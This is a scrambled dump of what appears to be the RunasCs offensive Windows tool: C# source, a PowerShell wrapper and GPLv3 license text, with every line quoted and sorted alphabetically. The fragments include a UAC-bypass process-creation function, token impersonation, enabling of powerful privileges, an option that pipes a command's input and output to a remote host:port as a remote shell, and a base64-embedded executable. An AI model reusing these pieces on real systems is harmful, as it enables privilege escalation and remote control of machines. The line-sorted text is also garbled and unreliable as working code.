"        TokenImpersonationLevel,"
"        TokenIntegrityLevel,"
"        TokenIsAppContainer,"
"        TokenIsAppSilo,"
"        TokenIsLessPrivilegedAppContainer,"
"        TokenIsRestricted,"
"        TokenIsSandboxed,"
"        TokenLinkedToken,"
"        TokenLogonSid,"
"        TokenMandatoryPolicy,"
"        TokenOrigin,"
"        TokenOwner,"
"        TokenPrimaryGroup,"
"        TokenPrivateNameSpace,"
"        TokenPrivileges,"
"        TokenProcessTrustLevel,"
"        TokenRestrictedDeviceClaimAttributes,"
"        TokenRestrictedDeviceGroups,"
"        TokenRestrictedSids,"
"        TokenRestrictedUserClaimAttributes,"
"        TokenSandBoxInert,"
"        TokenSecurityAttributes,"
"        TokenSessionId,"
"        TokenSessionReference,"
"        TokenSingletonAttributes,"
"        TokenSource,"
"        TokenStatistics,"
"        TokenType,"
"        TokenUIAccess,"
"        TokenUser = 1,"
"        TokenUserClaimAttributes,"
"        TokenVirtualizationAllowed,"
"        TokenVirtualizationEnabled,"
"        UNPROTECTED_DACL_SECURITY_INFORMATION = 0x20000000,"
"        UNPROTECTED_SACL_SECURITY_INFORMATION = 0x10000000,"
"        Unknown = -1,"
"        Untrusted = SECURITY_MANDATORY_UNTRUSTED_RID,"
"        WINSTA_ACCESSCLIPBOARD = 0x00000004,"
"        WINSTA_ACCESSGLOBALATOMS = 0x00000020,"
"        WINSTA_CREATEDESKTOP = 0x00000008,"
"        WINSTA_ENUMDESKTOPS = 0x00000001,"
"        WINSTA_ENUMERATE = 0x00000100,"
"        WINSTA_EXITWINDOWS = 0x00000040,"
"        WINSTA_READATTRIBUTES = 0x00000002,"
"        WINSTA_READSCREEN = 0x00000200,"
"        WINSTA_WRITEATTRIBUTES = 0x00000010,"
"        WRITE_DAC = 0x00040000,"
"        WRITE_OWNER = 0x00080000,"
"        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6)]"
"        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6, ArraySubType = UnmanagedType.I1)]"
"        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 64)]"
"        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 129)]"
"        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 257)]"
"        [Parameter(Position = 0, Mandatory = $True)]"
"        [Parameter(Position = 1, Mandatory = $True)]"
"        [Parameter(Position = 2, Mandatory = $True)]"
"        bool forceUserProfileCreation = false, bypassUac = false, remoteImpersonation = false"
"        bool result = AllocateAndInitializeSid(pLabelAuthorityStruct, 1, (int)integrity, 0, 0, 0, 0, 0, 0, 0, out pSID)"
"        createProcessFunctions.Add(0, ""CreateProcessAsUserW"")"
"        createProcessFunctions.Add(1, ""CreateProcessWithTokenW"")"
"        createProcessFunctions.Add(2, ""CreateProcessWithLogonW"")"
"        if ( connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0 ) {"
"        if (!AddAccessAllowedAce(pNewDacl, ACL_REVISION, ACCESS_MASK.DESKTOP_ALL, this.userSid))"
"        if (!AddAce(pDacl, ACL_REVISION, MAXDWORD, pNewAcePtr, aceSize))"
"        if (!AdjustTokenPrivileges(token, false, ref tokenp, 0, 0, 0))"
"        if (!CopySid((uint)GetLengthSid(this.userSid), sidStartPtr, this.userSid))"
"        if (!CreateProcess(null, commandLine, IntPtr.Zero, IntPtr.Zero, true, CREATE_NO_WINDOW "
"        if (!CreateProcessAsUser(hTokenDuplicate, null, commandLine, IntPtr.Zero, IntPtr.Zero, true, CREATE_NO_WINDOW "
"        if (!CreateProcessWithTokenW(hTokenDuplicate, logonFlags, null, commandLine, CREATE_NO_WINDOW, IntPtr.Zero, null, ref startupInfo, out processInfo))"
"        if (!DuplicateTokenEx(hToken, AccessToken.TOKEN_ALL_ACCESS, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TokenImpersonation, ref hTokenDupImpersonation))"
"        if (!DuplicateTokenEx(hToken, AccessToken.TOKEN_ALL_ACCESS, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TokenImpersonation, ref hTokenDuplicateLocal))"
"        if (!DuplicateTokenEx(hToken, AccessToken.TOKEN_ALL_ACCESS, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TokenPrimary, ref hTokenDuplicate))"
"        if (!GetSecurityDescriptorDacl(pSd, out fDaclPresent, ref pDacl, out fDaclExist))"
"        if (!GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevation, tokenElevationPtr, tokenInfLength, out tokenInfLength))"
"        if (!GetUserObjectSecurity(this.hDesktop, ref si, pSd, 0, out cbSd))"
"        if (!GetUserObjectSecurity(this.hDesktop, ref si, pSd, cbSd, out cbSd))"
"        if (!GetUserObjectSecurity(this.hWinsta, ref si, pSd, 0, out cbSd))"
"        if (!GetUserObjectSecurity(this.hWinsta, ref si, pSd, cbSd, out cbSd))"
"        if (!InitializeAcl(pNewDacl, cbNewDacl, ACL_REVISION))"
"        if (!InitializeSecurityDescriptor(pNewSd, SECURITY_DESCRIPTOR_REVISION))"
"        if (!LogonUser(username, domainName, password, logonType, LOGON32_PROVIDER_DEFAULT, ref hToken))"
"        if (!LogonUser(username, domainName, password, logonType, logonProvider, ref hToken))"
"        if (!LogonUser(username, domainName, password, logonType, logonProvider, ref hTokenCheck1)) {"
"        if (!LookupAccountName(null,fqan,Sid,ref cbSid,referencedDomainName,ref cchReferencedDomainName,out sidUse))"
"        if (!OpenProcessToken(processInfo.process, AccessToken.TOKEN_ALL_ACCESS, out hTokenProcess))"
"        if (!SetSecurityDescriptorDacl(pNewSd, true, pNewDacl, false))"
"        if (!SetThreadToken(ref processInfo.thread, hTokenDupImpersonation))"
"        if (!SetUserObjectSecurity(this.hDesktop, ref si, pNewSd))"
"        if (!SetUserObjectSecurity(this.hWinsta, ref si, pNewSd))"
"        if (CreatePipe(out hReadPipe, out hWritePipe, ref sa, (uint)BUFFER_SIZE_PIPE))"
"        if (GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, pb, cb, out cb))"
"        if (IsLimitedUserLogon(hToken, username, domainName, password, out logonTypeNotFiltered))"
"        if (IsLimitedUserLogon(hTokenDuplicate, username, domainName, password, out logonTypeNotFiltered))"
"        if (args[0].ToLower() == ""cmd"" "
"        if (args[0].ToLower() == ""powershell"" "
"        if(!GetUserObjectInformation(hWinstaSave, UOI_NAME, stationNameBytes, 256, out lengthNeeded)){"
"        if(!ReadFile(hReadPipe, buffer, BUFFER_SIZE_PIPE, out dwBytesRead, IntPtr.Zero)){"
"        if(domain != """" "
"        int logonType = 2, createProcessFunction = DefaultCreateProcessFunction()"
"        logonTypes.Add(10,""RemoteInteractive"")"
"        logonTypes.Add(11,""CachedInteractive"")"
"        logonTypes.Add(2, ""Interactive"")"
"        logonTypes.Add(3, ""Network"")"
"        logonTypes.Add(4, ""Batch"")"
"        logonTypes.Add(5, ""Service"")"
"        logonTypes.Add(7, ""Unlock"")"
"        logonTypes.Add(8, ""NetworkCleartext"")"
"        logonTypes.Add(9, ""NewCredentials"")"
"        result = LogonUser(username, domainName, password, logonType, logonProvider, ref hToken)"
"        result = SetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, pLabel, labelSize)"
"        return ""CreateProcessWithLogonW()"""
"        return ""Error"""
"        return param == ""-h"" "
"        socket = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, IntPtr.Zero, 0, 0)"
"        sockinfo.sin_addr = BitConverter.ToUInt32(((IPAddress.Parse(host)).GetAddressBytes()), 0)"
"        stationName = Encoding.Default.GetString(stationNameBytes).Substring(0, (int)lengthNeeded-1)"
"        string desktopName = this.stationDaclObj.AddAclToActiveWindowStation(domainName, username, logonType)"
"        string fqan = """""
"        string lpDesktop = """""
"        string output = """""
"        string stationName = """""
"        string username, password, cmd, domain"
"        string[] privileges = { ""SeAssignPrimaryTokenPrivilege"", ""SeAuditPrivilege"", ""SeBackupPrivilege"", ""SeChangeNotifyPrivilege"", ""SeCreateGlobalPrivilege"", ""SeCreatePagefilePrivilege"", ""SeCreatePermanentPrivilege"", ""SeCreateSymbolicLinkPrivilege"", ""SeCreateTokenPrivilege"", ""SeDebugPrivilege"", ""SeDelegateSessionUserImpersonatePrivilege"", ""SeEnableDelegationPrivilege"", ""SeImpersonatePrivilege"", ""SeIncreaseBasePriorityPrivilege"", ""SeIncreaseQuotaPrivilege"", ""SeIncreaseWorkingSetPrivilege"", ""SeLoadDriverPrivilege"", ""SeLockMemoryPrivilege"", ""SeMachineAccountPrivilege"", ""SeManageVolumePrivilege"", ""SeProfileSingleProcessPrivilege"", ""SeRelabelPrivilege"", ""SeRemoteShutdownPrivilege"", ""SeRestorePrivilege"", ""SeSecurityPrivilege"", ""SeShutdownPrivilege"", ""SeSyncAgentPrivilege"", ""SeSystemEnvironmentPrivilege"", ""SeSystemProfilePrivilege"", ""SeSystemtimePrivilege"", ""SeTakeOwnershipPrivilege"", ""SeTcbPrivilege"", ""SeTimeZonePrivilege"", ""SeTrustedCredManAccessPrivilege"", ""SeUndockPrivilege"", ""SeUnsolicitedInputPrivilege"" }"
"    ""keep intact all notices""."
"    $RunasCsBase64 = ""TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAAERZGQAAAAAAAAAAOAAAgELAQgAAMAAAAAgAAAAAAAAzt4AAAAgAAAA4AAAAABAAAAgAAAAEAAABAAAAAAAAAAEAAAAAAAAAAAgAQAAEAAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAIDeAABLAAAAAOAAALgCAAAAAAAAAAAAAAAAAAAAAAAAAAABAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAA1L4AAAAgAAAAwAAAABAAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAALgCAAAA4AAAABAAAADQAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAAABAAAQAAAA4AAAAAAAAAAAAAAAAAAAQAAAQgeAAAAAAAASAAAAAIABQBoRwAAGJcAAAEAAABvAAAGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEzACABwAAAABAAARKAMAAApvBAAACigFAAAKcwYAAApvBwAACgoGKh4CKAgAAAoqSgJyAQAAcAMoCQAACigKAAAKKnICcgEAAHADci8AAHAoAQAABigLAAAKKAoAAAoqZgMtBnJjAABwKgMXMwZykQAAcCpyxQAAcCoAABMwBABCAAAAAgAAERIA/hUGAAACEgAGjAYAAAIoEAAACn0zAAAEEgB"
"    $parametersRunasCs.add(""-d"")"
"    $parametersRunasCs.add(""-l"")"
"    $parametersRunasCs.add(""-t"")"
"    (including a physical distribution medium), accompanied by a"
"    (including a physical distribution medium), accompanied by the"
"    -b, --bypass-uac     "
"    -b, --bypass-uac"
"    -d, --domain domain"
"    -f, --function create_process_function"
"    -i, --remote-impersonation     "
"    -i, --remote-impersonation"
"    -l, --logon-type logon_type"
"    -p, --force-profile"
"    -r, --remote host:port"
"    -t, --timeout process_timeout"
"    // .NETv2 does not allow dict initialization with values. Therefore, we need a function :("
"    Corresponding Source, you remain obligated to ensure that it is"
"    License will therefore apply, along with any applicable section 7"
"    Redirect stdin, stdout and stderr of the specified command to a remote host"
"    Run a background process as a local user,"
"    This is free software, and you are welcome to redistribute it"
"    This program is distributed in the hope that it will be useful,"
"    [DllImport(""Kernel32.dll"", SetLastError = true)]"
"    [DllImport(""Kernel32.dll"", SetLastError=true)]"
"    [DllImport(""advapi32"", SetLastError = true, CharSet = CharSet.Unicode)]"
"    [DllImport(""advapi32.dll"")]"
"    [DllImport(""advapi32.dll"", CharSet = CharSet.Unicode, SetLastError = true)]"
"    [DllImport(""advapi32.dll"", CharSet=CharSet.Unicode, SetLastError = true)]"
"    [DllImport(""advapi32.dll"", EntryPoint=""DuplicateTokenEx"", SetLastError = true)]"
"    [DllImport(""advapi32.dll"", SetLastError = true)]"
"    [DllImport(""advapi32.dll"", SetLastError = true, BestFitMapping = false, ThrowOnUnmappableChar = true)]"
"    [DllImport(""advapi32.dll"", SetLastError = true, CharSet=CharSet.Unicode)]"
"    [DllImport(""advapi32.dll"", SetLastError=true)]"
"    [DllImport(""advapi32.dll"", SetLastError=true, CharSet=CharSet.Unicode)]"
"    [DllImport(""kernel32.dll"")]"
"    [DllImport(""kernel32.dll"", CharSet = CharSet.Unicode, SetLastError = true)]"
"    [DllImport(""kernel32.dll"", SetLastError = true)]"
"    [DllImport(""kernel32.dll"", SetLastError = true, CharSet = CharSet.Auto, EntryPoint = ""CreateProcess"")]"
"    [DllImport(""kernel32.dll"", SetLastError=true)]"
"    [DllImport(""user32"", CharSet = CharSet.Unicode, SetLastError = true)]"
"    [DllImport(""user32.dll"")]"
"    [DllImport(""user32.dll"", SetLastError = true)]"
"    [DllImport(""user32.dll"", SetLastError=true)]"
"    [DllImport(""userenv.dll"", SetLastError = true, CharSet = CharSet.Auto)]"
"    [DllImport(""userenv.dll"", SetLastError=true, CharSet = CharSet.Auto)]"
"    [DllImport(""ws2_32.dll"", CharSet = CharSet.Ansi, SetLastError = true)]"
"    [DllImport(""ws2_32.dll"", CharSet = CharSet.Auto)]"
"    [DllImport(""ws2_32.dll"", CharSet = CharSet.Auto, SetLastError=true)]"
"    [DllImport(""ws2_32.dll"", CharSet = CharSet.Unicode, SetLastError = true)]"
"    [DllImport(""ws2_32.dll"", SetLastError = true)]"
"    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]"
"    [StructLayout(LayoutKind.Sequential, Pack = 4)]"
"    a) Convey the object code in, or embodied in, a physical product"
"    additional terms, to the whole of the work, and all its parts,"
"    along with this program.  If not, see <https://www.gnu.org/licenses/>."
"    alternative is allowed only occasionally and noncommercially, and"
"    b) Convey the object code in, or embodied in, a physical product"
"    c) Prohibiting misrepresentation of the origin of that material, or"
"    c) You must license the entire work, as a whole, under this"
"    conveying of source, or (2) access to copy the"
"    copy the object code is a network server, the Corresponding Source"
"    d) If the work has interactive user interfaces, each must display"
"    e) Convey the object code using peer-to-peer transmission, provided"
"    interfaces that do not display Appropriate Legal Notices, your"
"    it) with contractual assumptions of liability to the recipient, for"
"    it, and giving a relevant date."
"    medium customarily used for software interchange, for a price no"
"    model, to give anyone who possesses the object code either (1) a"
"    only if you received the object code with such an offer, in accord"
"    permission to license the work in any other way, but it does not"
"    place (gratis or for a charge), and offer equivalent access to the"
"    private IntPtr GetUserSid(string domain, string username){"
"    private bool CreateAnonymousPipeEveryoneAccess(ref IntPtr hReadPipe, ref IntPtr hWritePipe)"
"    private bool CreateProcessWithLogonWUacBypass(int logonType, uint logonFlags, string username, string domainName, string password, string processPath, string commandLine, ref STARTUPINFO startupInfo, out ProcessInformation processInfo) {"
"    private bool ImpersonateLoggedOnUserWithProperIL(IntPtr hToken, out IntPtr hTokenDuplicate) {"
"    private bool IsLimitedUserLogon(IntPtr hToken, string username, string domainName, string password, out int logonTypeNotFiltered) {"
"    private bool IsUserProfileCreated(string username, string password, string domainName, int logonType) {"
"    private const string error_string = ""[-] RunasCsException: """
"    private static Dictionary<int,string> getCreateProcessFunctionDict()"
"    private static Dictionary<int,string> getLogonTypeDict()"
"    private static extern Int32 WSAStartup(Int16 wVersionRequested, out WSAData wsaData)"
"    private static extern IntPtr GetSidSubAuthority(IntPtr sid, UInt32 subAuthorityIndex)"
"    private static extern IntPtr OpenDesktop(string lpszDesktop, uint dwFlags, bool fInherit, ACCESS_MASK dwDesiredAccess)"
"    private static extern IntPtr OpenWindowStation([MarshalAs(UnmanagedType.LPTStr)] string lpszWinSta,[MarshalAs(UnmanagedType.Bool)]bool fInherit, ACCESS_MASK dwDesiredAccess)"
"    private static extern IntPtr WSASocket([In] AddressFamily addressFamily, [In] SocketType socketType, [In] ProtocolType protocolType, [In] IntPtr protocolInfo, [In] uint group, [In] int flags)"
"    private static extern UInt32 WaitForSingleObject(IntPtr handle, UInt32 milliseconds)"
"    private static extern bool AddAccessAllowedAce(IntPtr pAcl, uint dwAceRevision, ACCESS_MASK AccessMask, IntPtr pSid)"
"    private static extern bool AddAce(IntPtr pAcl, uint dwAceRevision, uint dwStartingAceIndex, IntPtr pAceList, uint nAceListLength)"
"    private static extern bool AdjustTokenPrivileges(IntPtr tokenhandle, bool disableprivs, [MarshalAs(UnmanagedType.Struct)] ref TOKEN_PRIVILEGES_2 Newstate, int bufferlength, int PreivousState, int Returnlength)"
"    private static extern bool AllocateAndInitializeSid(IntPtr pIdentifierAuthority, byte nSubAuthorityCount, int dwSubAuthority0, int dwSubAuthority1, int dwSubAuthority2, int dwSubAuthority3, int dwSubAuthority4, int dwSubAuthority5,  int dwSubAuthority6, int dwSubAuthority7, out IntPtr pSid)"
"    private static extern bool CopySid(uint nDestinationSidLength, IntPtr pDestinationSid, IntPtr pSourceSid)"
"    private static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit )"
"    private static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize)"
"    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out ProcessInformation lpProcessInformation)"
"    private static extern bool CreateProcessAsUser(IntPtr hToken,string lpApplicationName,string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,bool bInheritHandles,uint dwCreationFlags,IntPtr lpEnvironment,string lpCurrentDirectory,ref STARTUPINFO lpStartupInfo,out ProcessInformation lpProcessInformation)"
"    private static extern bool CreateProcessWithLogonW(String userName,String domain,String password,UInt32 logonFlags,String applicationName,String commandLine,uint creationFlags,UInt32 environment,String currentDirectory,ref STARTUPINFO startupInfo,out  ProcessInformation processInformation)"
"    private static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out ProcessInformation lpProcessInformation)"
"    private static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions)"
"    private static extern bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess, IntPtr lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, int TokenType, ref IntPtr DuplicateTokenHandle)"
"    private static extern bool GetAce(IntPtr aclPtr, int aceIndex, out IntPtr acePtr)"
"    private static extern bool GetAclInformation(IntPtr pAcl, ref ACL_SIZE_INFORMATION pAclInformation, uint nAclInformationLength, ACL_INFORMATION_CLASS dwAclInformationClass)"
"    private static extern bool GetSecurityDescriptorDacl(IntPtr pSecurityDescriptor, [MarshalAs(UnmanagedType.Bool)] out bool bDaclPresent, ref IntPtr pDacl,[MarshalAs(UnmanagedType.Bool)] out bool bDaclDefaulted)"
"    private static extern bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength)"
"    private static extern bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation,uint TokenInformationLength,out uint ReturnLength)"
"    private static extern bool GetUserObjectInformation(IntPtr hObj, int nIndex,[Out] byte [] pvInfo, uint nLength, out uint lpnLengthNeeded)"
"    private static extern bool GetUserProfileDirectory(IntPtr hToken, StringBuilder path, ref int dwSize)"
"    private static extern bool InitializeAcl(IntPtr pAcl, uint nAclLength, uint dwAclRevision)"
"    private static extern bool InitializeSecurityDescriptor(IntPtr SecurityDescriptor, uint dwRevision)"
"    private static extern bool LoadUserProfile(IntPtr hToken, ref PROFILEINFO lpProfileInfo)"
"    private static extern bool LogonUser([MarshalAs(UnmanagedType.LPStr)] string pszUserName, [MarshalAs(UnmanagedType.LPStr)] string pszDomain, [MarshalAs(UnmanagedType.LPStr)] string pszPassword, int dwLogonType, int dwLogonProvider, ref IntPtr phToken)"
"    private static extern bool LogonUser([MarshalAs(UnmanagedType.LPStr)] string pszUserName,[MarshalAs(UnmanagedType.LPStr)] string pszDomain,[MarshalAs(UnmanagedType.LPStr)] string pszPassword,int dwLogonType,int dwLogonProvider,ref IntPtr phToken)"
"    private static extern bool LookupAccountName(string lpSystemName, string lpAccountName, [MarshalAs(UnmanagedType.LPArray)] byte[] Sid, ref uint cbSid, StringBuilder ReferencedDomainName, ref uint cchReferencedDomainName, out SID_NAME_USE peUse)"
"    private static extern bool LookupPrivilegeName(string lpSystemName, IntPtr lpLuid, StringBuilder lpName, ref int cchName )"
"    private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle)"
"    private static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped)"
"    private static extern bool SetNamedPipeHandleState(IntPtr hNamedPipe, ref UInt32 lpMode, IntPtr lpMaxCollectionCount, IntPtr lpCollectDataTimeout)"
"    private static extern bool SetSecurityDescriptorDacl(IntPtr sd, bool daclPresent, IntPtr dacl, bool daclDefaulted)"
"    private static extern bool SetThreadToken(ref IntPtr pHandle, IntPtr hToken)"
"    private static extern bool SetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength)"
"    private static extern bool UnloadUserProfile(IntPtr hToken, IntPtr hProfile)"
"    private static extern int LookupPrivilegeValue(string lpsystemname, string lpname, [MarshalAs(UnmanagedType.Struct)] ref LUID lpLuid)"
"    private static extern int connect(IntPtr s, ref SOCKADDR_IN addr, int addrsize)"
"    private static extern uint SetSecurityInfo(IntPtr handle, SE_OBJECT_TYPE ObjectType, uint SecurityInfo, IntPtr psidOwner, IntPtr psidGroup, IntPtr pDacl, IntPtr pSacl)"
"    private static readonly byte[] MANDATORY_LABEL_AUTHORITY = new byte[] { 0, 0, 0, 0, 0, 16 }"
"    private static readonly string help = @"""
"    private void AddAllowedAceToDACL(IntPtr pDacl, ACCESS_MASK mask, byte aceFlags, uint aceSize){"
"    private void CheckAvailableUserLogonType(string username, string password, string domainName, int logonType, int logonProvider) {"
"    private void GetUserEnvironmentBlock(IntPtr hToken, string username, bool forceProfileCreation, bool userProfileExists, out IntPtr lpEnvironment)"
"    private void RunasCreateProcessAsUserW(string username, string domainName, string password, int logonType, int logonProvider, string commandLine, bool forceUserProfileCreation, bool userProfileExists, ref STARTUPINFO startupInfo, ref ProcessInformation processInfo, ref int logonTypeNotFiltered) {"
"    private void RunasCreateProcessWithLogonW(string username, string domainName, string password, int logonType, uint logonFlags, string commandLine, bool bypassUac, ref STARTUPINFO startupInfo, ref ProcessInformation processInfo, ref int logonTypeNotFiltered) {"
"    private void RunasCreateProcessWithTokenW(string username, string domainName, string password, string commandLine, int logonType, uint logonFlags, int logonProvider, ref STARTUPINFO startupInfo, ref ProcessInformation processInfo, ref int logonTypeNotFiltered) {"
"    private void RunasRemoteImpersonation(string username, string domainName, string password, int logonType, int logonProvider, string commandLine, ref STARTUPINFO startupInfo, ref ProcessInformation processInfo, ref int logonTypeNotFiltered) {"
"    private void RunasSetupStdHandlesForProcess(uint processTimeout, string[] remote, ref STARTUPINFO startupInfo, out IntPtr hOutputWrite, out IntPtr hErrorWrite, out IntPtr hOutputRead, out IntPtr socket) {"
"    product that is covered by this License, on a durable physical"
"    public RunasCsException(string win32FunctionName, bool returnWin32Error) : base(error_string "
"    public static bool SetTokenIntegrityLevel(IntPtr hToken, IntegrityLevel integrity)"
"    public static string EnablePrivilege(string privilege, IntPtr token)"
"    public string AddAclToActiveWindowStation(string domain, string username, int logonType){"
"    public string RunAs(string username, string password, string cmd, string domainName, uint processTimeout, int logonType, int createProcessFunction, string[] remote, bool forceUserProfileCreation, bool bypassUac, bool remoteImpersonation)"
"    that supports equivalent copying facilities, provided you maintain"
"    the Free Software Foundation, either version 3 of the License, or"
"    trade names, trademarks, or service marks"
"    written offer, valid for at least three years and valid for as"
"  ""Additional permissions"" are terms that supplement the terms of this"
"  ""Copyright"" also means copyright-like laws that apply to other kinds of"
"  ""Installation Information"" for a User Product means any methods,"
"  ""The Program"" refers to any copyrightable work licensed under this"
"  ""This License"" refers to version 3 of the GNU General Public License."
"  A ""Standard Interface"" means an interface that either is an official"
"  A ""User Product"" is either (1) a ""consumer product"", which means any"
"  A ""contributor"" is a copyright holder who authorizes use under this"
"  A ""covered work"" means either the unmodified Program or a work based"
"  A contributor's ""essential patent claims"" are all patent claims"
"  A patent license is ""discriminatory"" if it does not include within"
"  A separable portion of the object code, whose source code is excluded"
"  Additional terms, permissive or non-permissive, may be stated in the"
"  All other non-permissive additional terms are considered ""further"
"  An ""entity transaction"" is a transaction transferring control of an"
"  An interactive user interface displays ""Appropriate Legal Notices"""
"  Corresponding Source conveyed, and Installation Information provided,"
"  Each contributor grants you a non-exclusive, worldwide, royalty-free"
"  Each time you convey a covered work, the recipient automatically"
"  Finally, every program is threatened constantly by software patents."
"  For example, if you distribute copies of such a program, whether"
"  For the developers' and authors' protection, the GPL clearly explains"
"  However, if you cease all violation of this License, then your"
"  If conditions are imposed on you (whether by court order, agreement or"
"  If the program does terminal interaction, make it output a short"
"  If you add terms to a covered work in accord with this section, you"
"  If you convey a covered work, knowingly relying on a patent license,"
"  If you convey an object code work under this section in, or with, or"
"  If you develop a new program, and you want it to be of the greatest"
"  If, pursuant to or in connection with a single transaction or"
"  In the following three paragraphs, a ""patent license"" is any express"
"  Moreover, your license from a particular copyright holder is"
"  Notwithstanding any other provision of this License, for material you"
"  Notwithstanding any other provision of this License, you have"
"  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY"
"  The ""Corresponding Source"" for a work in object code form means all"
"  The ""System Libraries"" of an executable work include anything, other"
"  The ""source code"" for a work means the preferred form of the work"
"  The GNU General Public License is a free, copyleft license for"
"  The precise terms and conditions for copying, distribution and"
"  To ""convey"" a work means any kind of propagation that enables other"
"  To ""modify"" a work means to copy from or adapt all or part of the work"
"  To ""propagate"" a work means to do anything with it that, without"
"  To do so, attach the following notices to the program.  It is safest"
"  To protect your rights, we need to prevent others from denying you"
"  When we speak of free software, we are referring to freedom, not"
"  When you convey a copy of a covered work, you may at your option"
"  When you convey a covered work, you waive any legal power to forbid"
"  You may charge any price or no price for each copy that you convey,"
"  You may convey a work based on the Program, or the modifications to"
"  You may make, run and propagate covered works that you do not"
"  You should also get your employer (if you work as a programmer) or school,"
" "" created in background."
" "" does not exists. Use --force-profile if you want to force the creation."")"
" "" failed with error code: "" "
" "" has not been found. """
" "" succeeded"""
" "" with process function "" "
" "" with process function 'Remote Impersonation' "
" ""' with pid "" "
" ""'. Reverting to the Interactive logon type '2'. To force a specific logon type, use the flag combination --remote-impersonation and --logon-type."")"
" ""'. Reverting to the NetworkCleartext logon type '8'. To force a specific logon type, use the flag combination --bypass-uac and --logon-type."")"
" ""LookupAccountName"", true)"
" // On Windows Server 2003 this error is/can be returned, but processing can still continue"
" 2, out data) != 0 ) {"
" Allows to specify the logon type, e.g. 8-NetworkCleartext logon (no "
" CREATE_UNICODE_ENVIRONMENT, lpEnvironment, Environment.GetEnvironmentVariable(""SystemRoot"") "
" Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>"
" GENERIC_ALL,"
" LOGON_NETCREDENTIALS_ONLY, processPath, commandLine, CREATE_NO_WINDOW, (UInt32)0, null, ref startupInfo, out processInfo)"
" LogonUser(username, domainName, password, LOGON32_LOGON_BATCH, LOGON32_PROVIDER_DEFAULT, ref hTokenBatch) "
" LogonUser(username, domainName, password, LOGON32_LOGON_SERVICE, LOGON32_PROVIDER_DEFAULT, ref hTokenService) "
" OBJECT_INHERIT_ACE, cbNewAce)"
" [What is up with ""The application failed to initialize properly (0xc0000142)"" error"
" args[0].ToLower() == ""cmd.exe"") {"
" args[0].ToLower() == ""powershell.exe"") {"
" authentications over the Network as it stores credentials in the authentication package. If you holds enough privileges, try to always specify this logon type through the flag --logon-type 8."
" domain != ""."")"
" for a GUI interface, you would use an ""about box""."
" functions to be used, depending"
" however, if the Program has interactive"
" of this license document, but changing it is not allowed."
" param == ""--help"" "
" param == ""/"
" privilege, true)"
" userProfileExists)) UnloadUserProfile(hToken, profileInfo.hProfile)"
"""Major Component"", in this context, means a major essential component"
"""aggregate"" if the compilation and its resulting copyright are not"
"""recipients"" may be individuals or organizations."
"(1) assert copyright on the software, and (2) offer you this License"
"(if any) on which the executable work runs, or a compiler used to"
"(kernel, window system, and so on) of the specific operating system"
"11 of the WIPO copyright treaty adopted on 20 December 1996, or"
"= ""No output received from the process."
"= ""["
"= ""[-] Allowed values are:"
"= ""[-] Expected format: 'host:port'"""
"= EnablePrivilege(privilege, token)"
